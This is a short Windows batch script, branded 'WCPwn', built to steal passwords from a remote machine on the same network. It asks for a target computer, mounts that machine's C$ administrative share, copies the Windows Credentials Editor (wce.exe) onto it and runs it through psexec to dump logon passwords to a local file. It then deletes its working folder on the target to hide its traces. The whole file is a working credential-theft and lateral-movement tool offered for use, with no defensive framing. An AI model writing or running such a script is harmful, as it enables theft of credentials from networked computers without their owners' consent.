@echo off
:begin
cls
echo    __      _____________________                
echo   /  \    /  \_   ___ \______   \__  _  ______  
echo   \   \/\/   /    \  \/^|     ___/\ \/ \/ /    \ 
echo    \        /\     \___^|    ^|     \     /   ^|  \
echo     \__/\  /  \______  /____^|      \/\_/^|___^|  /
echo          \/          \/                      \/ 
echo.
set /p rc=Computer to steal passwords from:
if "%rc%" == "" goto begin
echo Removing previous mounts to x:
net use x: /delete >nul 2>&1
if %errorlevel% == 0 ( 
		echo Succesful!
	) else (
		echo Failed! No drive was not mounted?
	)
echo Mounting remote comuter's (rc) harddrive (\\RC\c$) to x:
net use x: \\%rc%\c$ >nul 2>&1
if %errorlevel% == 0 ( 
		echo Mount succesful!
	) else ( 
		echo Mount failed, aborting!
		pause
		goto begin
	)
echo Creating folders in RC
x:
cd /
mkdir rc
c:
copy wce.exe x:\rc\wce.exe
psexec \\%rc% C:\rc\wce.exe -w >>%rc%-%random%.txt
copy x:\rc\%rc%.txt %rc%.txt
x:
RMDIR /S /Q rc
c:
echo DONE!
pause
net use x: /delete
goto begin
